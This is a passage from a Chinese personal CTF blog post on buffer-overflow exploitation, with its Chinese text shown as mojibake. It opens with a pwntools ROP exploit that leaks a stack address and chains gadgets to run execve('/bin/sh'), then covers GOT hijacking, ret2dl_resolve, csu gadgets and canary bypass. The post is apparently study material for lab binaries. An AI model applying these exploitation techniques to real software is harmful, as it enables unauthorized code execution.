= <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">main_addr = <span class="number">0x40051d</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">csu_front_addr = <span class="number">0x40059A</span></span><br><span class="line">csu_end_addr = <span class="number">0x400580</span></span><br><span class="line">ret_addr = <span class="number">0x400519</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(vul_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#æ³„éœ²å‡ºæ¥argvçš„åœ°å€</span></span><br><span class="line">log.info(<span class="string">'leaked_addr===&gt;'</span>+hex(leak_addr))</span><br><span class="line"><span class="comment">#print("----------&gt;",hex(leak_addr - 0x118))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">bin_sh = leak_addr - <span class="number">0x128</span></span><br><span class="line"><span class="comment">#ç”¨åç§»é€šè¿‡argvæ‰¾åˆ°binshåœ°å€</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(mov_rax_59) + p64(csu_front_addr)</span><br><span class="line"><span class="comment">#ebpå¤„æ”¾ç»™å¯„å­˜å™¨raxèµ‹å€¼çš„åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bin_sh+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#è¿™é‡Œå°±æ˜¯å·§å¦™çš„æ‰§è¡Œåˆ©ç”¨ï¼Œrbx ä¸ r12æ‰§è¡Œäº†mov_rax_59çš„æ“ä½œ</span></span><br><span class="line"><span class="comment">#bin_sh+0x10çš„ä½ç½®æ”¾å¾—æ˜¯æ‰§è¡Œmov rax 59 åœ°å€çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯rbpæ­¤æ—¶æŒ‡å‘çš„åœ°å€</span></span><br><span class="line"><span class="comment">#åé¢çš„ä¸‰ä¸ª0æ˜¯ç»™execvå‡½æ•°ä¼ å‚ï¼Œ/bin/shåœ¨4å­—èŠ‚çš„ediä¸­æ”¾ä¸ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å…ˆä¼ 0ï¼Œä¸‹é¢å†pop_rdi</span></span><br><span class="line">payload += p64(csu_end_addr)</span><br><span class="line">payload += <span class="number">0x38</span>*<span class="string">b'A'</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line"><span class="comment">#å¯„å­˜å™¨è¢«èµ‹å€¼ä¹‹åæ‰§è¡Œsyscallï¼Œå®ƒä¼šè‡ªåŠ¨åŒ¹é…è¦æ‰§è¡Œexecvï¼Œç„¶åå›å»64ä½å¯¹åº”çš„å¯„å­˜å™¨é‡Œé¢æ‰¾å‚æ•°</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>å¯ä»¥åˆ©ç”¨çš„csu</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/../../../../Desktop/ctf_huzai/win/writeup/pic/QQ%E6%88%AA%E5%9B%BE20201118220313.png" alt=""></h2><ul>
<li>ç”¨gdb+pwn è¿›è¡ŒåŠ¨æ€è°ƒè¯•,å¾—åˆ°å‡½æ•°æ ˆä¸­çš„çŠ¶æ€ä¸payloadçš„å¯¹åº”å…³ç³»,å¦‚ä¸‹</li>
</ul>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/buuoj_00039.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/buuoj_00038.png" alt=""></p>
<h4 id="4-hijiack-got-â€“-ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€-è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€"><a href="#4-hijiack-got-â€“-ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€-è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€" class="headerlink" title="4.hijiack got â€“ ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€"></a>4.hijiack got â€“ ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€</h4><ul>
<li><p>åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥</p>
<ul>
<li>é™æ€é“¾æ¥<ul>
<li>æŠŠéœ€è¦è°ƒç”¨çš„å‡½æ•°æˆ–è€…è¿‡ç¨‹é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­,æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€éƒ¨åˆ†,ä½¿å¾—æ–‡ä»¶åŒ…å«è¿è¡Œæ—¶çš„å…¨éƒ¨ä»£ç ,å½“å¤šä¸ªç¨‹åºè°ƒç”¨ç›¸åŒå‡½æ•°æ—¶,å†…å­˜ä¸­å°±ä¼šå‡ºç°å¤šä¸ªè¿™ä¸ªå‡½æ•°çš„æ‹·è´,æµªè´¹å†…å­˜</li>
</ul>
</li>
<li>åŠ¨æ€é“¾æ¥<ul>
<li>ä»…ä»…åœ¨è°ƒç”¨å¤„åŠ å…¥äº†æ‰€è°ƒç”¨å‡½æ•°çš„æè¿°ä¿¡æ¯(å¾€å¾€æ˜¯ä¸€äº›é‡å®šä½ä¿¡æ¯),å½“ç¨‹åºè¿è¡Œæ—¶,æ‰å›å»åŠ¨æ€çš„é“¾æ¥åˆ°ç›¸åº”çš„å‡½æ•°,åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶åç¼€ä¸º.so</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201030075922270.png" alt=""></li>
</ul>
</li>
</ul>
</li>
<li><p>GOTä¸PLT</p>
<ul>
<li><p>GOT(global offset table) å…¨å±€åç§»é‡è¡¨,ç”¨æ¥å‚¨å­˜å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€</p>
</li>
<li><p>PLT(procedure linkage table) ç¨‹åºé“¾æ¥è¡¨,ç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹</p>
</li>
<li><p>ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶è§£æå‡½æ•°åœ°å€å¹¶å­˜å…¥GOTè¡¨</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029154651550.png" alt=""></li>
</ul>
</li>
<li><p>ç¬¬äºŒæ¬¡è°ƒç”¨å‡½æ•°ç›´æ¥è¯»å–GOTä¸­çš„åœ°å€</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029154754376.png" alt=""></li>
</ul>
</li>
<li><p>æ•´ä¸ªè°ƒç”¨çš„è¿‡ç¨‹</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201030080054235.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å¦‚ä½•ç¡®å®šå‡½æ•°Aåœ¨GOTè¡¨ä¸­çš„ä½ç½®?</p>
<ul>
<li>ç¨‹åºè°ƒç”¨å‡½æ•°æ˜¯é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨çš„å¯¹åº”æ¡ç›®,åœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­æ‰¾åˆ°è¯¥å‡½æ•°åœ¨PLTä¸­çš„å…¥å£ç‚¹ä½ç½®,ä»è€Œå®šä½åˆ°è¯¥å‡½æ•°åœ¨GOTä¸­ çš„æ¡ç›®</li>
</ul>
</li>
<li><p>å¦‚ä½•ç¡®å®šå‡½æ•°Båœ¨å†…å­˜ä¸­çš„ä½ç½®?</p>
<ul>
<li>å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä½ç½®æ˜¯ç›¸å¯¹å›ºå®šçš„.å¦‚æœçŸ¥é“äº†å‡½æ•°Açš„è¿è¡Œåœ°å€(è¯»å–GOTè¡¨ä¸­çš„å†…å®¹),ä¹ŸçŸ¥é“Aå’ŒBåœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸å¯¹ä½ç½®,å°±å¯ä¸€æ¨æ–­å‡ºBçš„è¿è¡Œæ—¶åœ°å€</li>
</ul>
</li>
<li><p>å¦‚ä½•å®ç°GOTè¡¨ä¸­çš„æ•°æ®ä¿®æ”¹?</p>
<ul>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
</ul>
</li>
</ul>
<h4 id="5-Return-to-dl-resolve"><a href="#5-Return-to-dl-resolve" class="headerlink" title="5.Return-to-dl_resolve"></a>5.Return-to-dl_resolve</h4><ul>
<li>æ ¸å¿ƒæ€æƒ³æ˜¯åˆ©ç”¨dl_runtime_resolveå‡½æ•°è§£æå‡ºsystemå‡½æ•°çš„åœ°å€,é€šå¸¸åœ¨æ²¡æœ‰æä¾›libå‡½åº“çš„æƒ…å†µä¸‹ä½¿ç”¨.</li>
<li>ä½¿ç”¨æ¡ä»¶<ul>
<li>æœªç»™å‡ºlibcåº“</li>
<li>æ²¡æœ‰å¼€å¯PIEä¿æŠ¤,å¦‚æœå¼€å¯PIEéœ€è¦é€šè¿‡æ³„æ¼è·å–åŸºåœ°å€</li>
<li>æ²¡æœ‰å¼€å¯FULL RELOAD</li>
<li></li>
</ul>
</li>
</ul>
<h3 id="3-payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»"><a href="#3-payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»" class="headerlink" title="3. payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»"></a>3. payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»</h3><ul>
<li>payloadçš„é•¿åº¦å¯ä»¥ç”¨ payload.ljust(0x105,bâ€™aâ€™)è¿›è¡Œå¡«å……,ä½¿å¾—å¡«å……åçš„payloadçš„æ€»é•¿åº¦ä¸º0x106 Bytes </li>
<li><p>âš ï¸p32(0xdeadbeef) å 4ä¸ªByte</p>
</li>
<li><p>paylaodçš„å®é™…æ„ä¹‰æ˜¯é€šè¿‡è¾“å…¥çš„æº¢å‡º,å°†æˆ‘ä»¬éœ€è¦çš„æŒ‡ä»¤é€åˆ°ipè®©cpuæ‰§è¡Œ</p>
<ul>
<li>ä¸‹å›¾æ˜¯64ä½,ä¸­çš„å¯¹åº”å…³ç³»</li>
</ul>
</li>
</ul>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201106110733512.png" alt=""></p>
<p>â€‹            ç»è¿‡gdb+pwnè°ƒè¯•ï¼Œå¾—åˆ°æ­£ç¡®çš„å…³ç³»ï¼Œmainå®é™…ä¸Šæ˜¯è¿”å›å€¼</p>
<p>â€‹            <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/payload64.png" alt=""></p>
<ul>
<li><p>ä¸‹å›¾æ˜¯32ä½ä¸­çš„å¯¹åº”å…³ç³»</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201106172618456.png" alt=""></p>
</li>
</ul>
<h3 id="4-é€šç”¨çš„gadget"><a href="#4-é€šç”¨çš„gadget" class="headerlink" title="4.é€šç”¨çš„gadget"></a>4.é€šç”¨çš„gadget</h3><h5 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init()"></a>__libc_csu_init()</h5><ul>
<li><p>åœ¨ç¨‹åºç¼–è¯‘çš„è¿‡ç¨‹ä¸­,ä¼šè‡ªåŠ¨åŠ å…¥ä¸€äº›é€šç”¨å‡½æ•°çš„åˆå§‹åŒ–å·¥ä½œ,è¿™äº›åˆå§‹åŒ–å‡½æ•°éƒ½æ˜¯ç›¸åŒçš„,å› æ­¤å¯ä»¥è€ƒè™‘åœ¨è¿™äº›å‡½æ•°ä¸­æ‰¾åˆ°ä¸€äº›é€šç”¨çš„gadget</p>
<ul>
<li><p>éœ€è¦å…³æ³¨çš„å¯„å­˜å™¨</p>
<ul>
<li><p>r12  ä¿å­˜ç€å°†è¦è°ƒç”¨å‡½æ•°çš„æŒ‡é’ˆçš„åœ°å€</p>
</li>
<li><p>rcx  r8  r9  ç¬¬å››äº”å…­ä¸ªå‚æ•°</p>
</li>
<li><p>rdx   ç¬¬ä¸‰ä¸ªå‚æ•°</p>
</li>
<li><p>rsi    ç¬¬äºŒä¸ªå‚æ•°</p>
</li>
<li><p>rdi   ç¬¬ä¸€ä¸ªå‚æ•°</p>
</li>
<li><p>rbx å’Œ rbp çš„å€¼åˆ†åˆ«ä¸º0 1 </p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h3><ul>
<li><p>linuxä¸­çš„cookies,ç”¨æ¥æ£€æµ‹æº¢å‡ºå¹¶é˜»æ­¢æº¢å‡ºæ“ä½œ</p>
</li>
<li><p>å…¶åŸç†æ˜¯å½“ç¨‹åºå¯ç”¨canaryç¼–è¯‘å,åœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå–fså¯„å­˜å™¨0x20å¤„çš„å€¼.å­˜æ”¾åœ¨æ ˆä¸­</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov qword ptr [rbp-8], rax</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨å‡½æ•°è¿”å›ä¹‹å‰,ä¼šå°†è¯¥å€¼å–å‡º,å¹¶ä¸fs:0x28çš„å€¼è¿›è¡Œäº¦æˆ–.è¿™ä¸ªæ“ä½œæ—¢æ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º</p>
</li>
<li><p>å¦‚æœcanaryå·²ç»è¢«éæ³•ä¿®æ”¹,æ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ°__stack_chk_fail</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201104214925462.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»•è¿‡canary</p>
<ul>
<li>ç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¼šå¯¼è‡´ä»»æ„åœ°å€æ³„æ¼,å› æ­¤,åªè¦å¾—åˆ°è¾“å…¥å‚æ•°åœ¨æ ˆä¸­çš„ä½ç½®,å°±å¯ä»¥é€šè¿‡åç§»å¾—åˆ°canaryåœ¨æ ˆä¸­çš„ä½ç½®</li>
<li>ç„¶ååœ¨æ ˆæº¢å‡ºçš„paddingå—æŠŠcanaryæ‰€åœ¨çš„ä½ç½®çš„å€¼ç”¨æ­£ç¡®çš„canaryæ›¿æ¢,ä»è€Œç»•è¿‡canaryæ£€æµ‹</li>
</ul>
</li>
</ul>

        </div>
        
          


  <section class="meta" id="footer-meta">
    <hr>
    <div class="new-meta-box">
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-12T13:36:23+08:00">
  <a class="notlink">
    <i class="fas fa-clock" aria-hidden="true"></i>
    <p>last updated at Dec 12, 2020</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>PWN CTF</p></a></div>


        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="QQå¥½å‹" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/&title=PWN-ç¼“å†²åŒºæº¢å‡ºåŸç† | huzai9527's personal blog&summary=">
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="QQç©ºé—´" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/&title=PWN-ç¼“å†²åŒºæº¢å‡ºåŸç† | huzai9527's personal blog&summary=">
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="å¾®åš" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/&title=PWN-ç¼“å†²åŒºæº¢å‡ºåŸç† | huzai9527's personal blog&summary=">
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
          
        </a>
      
    
  </div>
</div>



        
      
    </div>
  </section>


        
        
            <div class="prev-next">
                
                    <section class="prev">
                        <span class="art-item-left">
                            <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous</h6>
                            <h4>
                                <a href="/2020/12/12/PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸç†/" rel="prev" title="PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸç†">
                                  
                                      PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸç†
                                  
                                </a>
                            </h4>
                            
                                
                                <h6 class="tags">
                                    <a class="tag" href="/tags/PWN-CTF/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>PWN CTF</a>
                                </h6>
                            
                        </span>
                    </section>
                
                
                    <section class="next">
                        <span class="art-item-right" aria-hidden="true">
                            <h6>Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                            <h4>
                                <a href="/2020/12/12/PWN-å †ç›¸å…³çš„æ¼æ´/" rel="prev" title="PWN-å †ç›¸å…³çš„æ¼æ´">
                                    
                                        PWN-å †ç›¸å…³çš„æ¼æ´
                                    
                                </a>
                            </h4>
                            
                                
                                <h6 class="tags">
                                    <a class="tag" href="/tags/PWN-CTF/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>PWN CTF</a>
                                </h6>
                            
                        </span>
                    </section>
                
            </div>
        
      </section>
    </article>
  

  
    <!-- æ˜¾ç¤ºæ¨èæ–‡ç« å’Œè¯„è®º -->



  


  




<!-- æ ¹æ®é¡µé¢mathjaxå˜é‡å†³å®šæ˜¯å¦åŠ è½½MathJaxæ•°å­¦å…¬å¼js -->



  <script>
    window.subData = {
      title: 'PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†',
      tools: true
    }
  </script>


</div>
<aside class="l_side">
  
    
    
      
        
          
          
            <section class="widget author">
  <div class="content material">
    
      <div class="avatar">
        <img class="avatar" src="https://i.loli.net/2019/08/27/SCTrzsMhKIg2OYq.jpg">
      </div>
    
    
      <div class="text">
        
        
          <p>ç‹å­å’Œå…¬ä¸»è¿‡ä¸Šäº†æ€§ç¦çš„ç”Ÿæ´»ï¼Œé‚£å®ˆåŸçš„å°å…µå‘¢ï¼Ÿ</p>

        
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
      </div>
    
  </div>
</section>

          
        
      
        
          
          
            

          
        
      
        
          
          
            
  <section class="widget tagcloud">
    
<header class="material">
  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;Hot Tags</div>
  
    <a class="rightBtn" rel="nofollow" href="/tags" title="/tags">
    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
  
</header>

    <div class="content material">
      <a href="/tags/PWN-CTF/" style="font-size: 24px; color: #555">PWN CTF</a> <a href="/tags/c/" style="font-size: 14px; color: #999">c++</a> <a href="/tags/docker/" style="font-size: 14px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 14px; color: #999">git</a> <a href="/tags/github/" style="font-size: 14px; color: #999">github</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 17.33px; color: #828282">python</a> <a href="/tags/python-scrapy-çˆ¬è™«/" style="font-size: 14px; color: #999">python scrapy çˆ¬è™«</a> <a href="/tags/ubuntu/" style="font-size: 14px; color: #999">ubuntu</a> <a href="/tags/æ•°æ®åˆ†æ/" style="font-size: 20.67px; color: #6c6c6c">æ•°æ®åˆ†æ</a> <a href="/tags/ç½‘ç»œç¼–ç¨‹-python/" style="font-size: 14px; color: #999">ç½‘ç»œç¼–ç¨‹ python</a>
    </div>
  </section>


          
        
      
        
          
          
            


  <section class="widget music">
    
<header class="material">
  <div><i class="fas fa-compact-disc fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;æœ€è¿‘åœ¨å¬</div>
  
    <a class="rightBtn" rel="external nofollow noopener noreferrer" target="_blank" href="https://music.163.com/#/user/home?id=63035382" title="https://music.163.com/#/user/home?id=63035382">
    <i class="far fa-heart fa-fw"></i></a>
  
</header>

    <div class="content material">
      
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
  <div class="aplayer" data-theme="#1BCDFC" data-mode="circulation" data-server="netease" data-type="playlist" data-id="2615636388" data-volume="0.7">
  </div>
  <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>


    </div>
  </section>


          
        
      
    

  
</aside>

<footer id="footer" class="clearfix">
  
  
    <div class="social-wrapper">
      
        
          <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
    </div>
  
  <br>
  <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
  <div>
    Use
    <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a>
    as theme
    
      , 
      total visits
      <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
      times
    
    . 
  </div>
</footer>
<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>

  <script>
    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
    var ALGOLIA_API_KEY = "";
    var ALGOLIA_APP_ID = "";
    var ALGOLIA_INDEX_NAME = "";
    var AZURE_SERVICE_NAME = "";
    var AZURE_INDEX_NAME = "";
    var AZURE_QUERY_KEY = "";
    var BAIDU_API_ID = "";
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/"||"/";
    if(!ROOT.endsWith('/'))ROOT += '/';
  </script>

<script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>


  <script async src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      const $reveal = $('.reveal');
      if ($reveal.length === 0) return;
      const sr = ScrollReveal({ distance: 0 });
      sr.reveal('.reveal');
    });
  </script>


  <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>




  
  
  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
    <script type="text/javascript">
      $(function(){
        if ('.cover') {
          $('.cover').backstretch(
          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
          {
            duration: "6000",
            fade: "2500"
          });
        } else {
          $.backstretch(
          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
          {
            duration: "6000",
            fade: "2500"
          });
        }
      });
    </script>
  











  <script src="/js/app.js"></script>


  <script src="/js/search.js"></script>




<!-- å¤åˆ¶ -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  let COPY_SUCCESS = "Copied";
  let COPY_FAILURE = "Copy failed";
  /*é¡µé¢è½½å…¥å®Œæˆåï¼Œåˆ›å»ºå¤åˆ¶æŒ‰é’®*/
  !function (e, t, a) {
    /* code */
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '  <i class="fa fa-copy"></i><span>Copy</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });

      clipboard.on('success', function(e) {
        //æ‚¨å¯ä»¥åŠ å…¥æˆåŠŸæç¤º
        console.info('Action:', e.action);
        console.info('Text:', e.text);
        console.info('Trigger:', e.trigger);
        success_prompt(COPY_SUCCESS);
        e.clearSelection();
      });
      clipboard.on('error', function(e) {
        //æ‚¨å¯ä»¥åŠ å…¥å¤±è´¥æç¤º
        console.error('Action:', e.action);
        console.error('Trigger:', e.trigger);
        fail_prompt(COPY_FAILURE);
      });
    }
    initCopyCode();

  }(window, document);

  /**
   * å¼¹å‡ºå¼æç¤ºæ¡†ï¼Œé»˜è®¤1.5ç§’è‡ªåŠ¨æ¶ˆå¤±
   * @param message æç¤ºä¿¡æ¯
   * @param style æç¤ºæ ·å¼ï¼Œæœ‰alert-successã€alert-dangerã€alert-warningã€alert-info
   * @param time æ¶ˆå¤±æ—¶é—´
   */
  var prompt = function (message, style, time)
  {
      style = (style === undefined) ? 'alert-success' : style;
      time = (time === undefined) ? 1500 : time*1000;
      $('<div>')
          .appendTo('body')
          .addClass('alert ' + style)
          .html(message)
          .show()
          .delay(time)
          .fadeOut();
  };

  // æˆåŠŸæç¤º
  var success_prompt = function(message, time)
  {
      prompt(message, 'alert-success', time);
  };

  // å¤±è´¥æç¤º
  var fail_prompt = function(message, time)
  {
      prompt(message, 'alert-danger', time);
  };

  // æé†’
  var warning_prompt = function(message, time)
  {
      prompt(message, 'alert-warning', time);
  };

  // ä¿¡æ¯æç¤º
  var info_prompt = function(message, time)
  {
      prompt(message, 'alert-info', time);
  };

</script>


<!-- fancybox -->
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
